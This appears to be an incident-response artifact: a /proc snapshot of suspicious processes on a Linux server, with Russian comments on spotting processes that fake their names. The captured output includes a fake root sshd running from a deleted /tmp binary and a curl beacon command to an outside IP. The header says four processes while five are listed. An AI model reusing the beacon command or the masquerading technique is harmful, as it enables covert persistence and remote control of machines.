@@ -1,0 +1,90 @@
+# Снимок /proc по четырём процессам shadow-server-01
+# Снят 17 октября в 07:44, следом за таблицей процессов.
+#
+# Команда (для каждого PID):
+#   ls -l /proc/PID/exe /proc/PID/cwd
+#   tr '\0' ' ' < /proc/PID/cmdline; echo
+#   grep -E '^(Name|State|PPid|Uid|Gid|Threads):' /proc/PID/status
+#   ls -l /proc/PID/fd
+#
+# Зачем это нужно, если есть ps: строку COMMAND в выводе ps процесс задаёт
+# сам — она берётся из его же /proc/PID/cmdline и переписывается изнутри
+# одним присваиванием argv[0]. А символьная ссылка /proc/PID/exe ведёт на
+# файл, который ядро действительно загрузило, и подделать её процесс не может.
+# Пометка «(deleted)» означает, что файл удалён с диска, а процесс с ним
+# продолжает работать: содержимое живо, пока открыт дескриптор.
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+=== /proc/1043 ===
+exe -> /usr/sbin/sshd
+cwd -> /
+cmdline: /usr/sbin/sshd -D
+Name:	sshd
+State:	S (sleeping)
+PPid:	1
+Uid:	0	0	0	0
+Gid:	0	0	0	0
+Threads:	1
+fd/0 -> /dev/null
+fd/1 -> /dev/null
+fd/2 -> /dev/null
+fd/3 -> socket:[24817]
+fd/4 -> socket:[24819]
+
+=== /proc/7180 ===
+exe -> /usr/local/sbin/sshd
+cwd -> /
+cmdline: /usr/sbin/sshd -D
+Name:	sshd
+State:	S (sleeping)
+PPid:	1
+Uid:	0	0	0	0
+Gid:	0	0	0	0
+Threads:	1
+fd/0 -> /dev/null
+fd/1 -> /dev/null
+fd/2 -> /dev/null
+fd/3 -> socket:[41102]
+fd/9 -> /etc/ssh/sshd_config.d/99-extra.conf
+
+=== /proc/6623 ===
+exe -> /tmp/.ICE-unix/sshd (deleted)
+cwd -> /home/devops
+cmdline: sshd: root@notty
+Name:	sshd
+State:	S (sleeping)
+PPid:	1
+Uid:	0	0	0	0
+Gid:	0	0	0	0
+Threads:	4
+fd/0 -> /dev/null
+fd/1 -> /home/devops/.cache/session.log
+fd/2 -> /home/devops/.cache/session.log
+fd/3 -> socket:[39764]
+fd/4 -> /tmp/.ICE-unix/sshd (deleted)
+
+=== /proc/6641 ===
+exe -> /usr/bin/curl
+cwd -> /home/devops
+cmdline: /usr/bin/curl --retry 60 --retry-delay 900 -sk https://185.220.101.47/beacon
+Name:	curl
+State:	S (sleeping)
+PPid:	6623
+Uid:	0	0	0	0
+Gid:	0	0	0	0
+Threads:	1
+fd/0 -> /dev/null
+fd/1 -> pipe:[39801]
+fd/2 -> /dev/null
+fd/3 -> socket:[39812]
+
+=== /proc/4412 ===
+exe -> (нет: процесс завершился, образ освобождён)
+cwd -> (нет)
+cmdline: (пуст)
+Name:	tar
+State:	Z (zombie)
+PPid:	4400
+Uid:	0	0	0	0
+Gid:	0	0	0	0
+Threads:	1
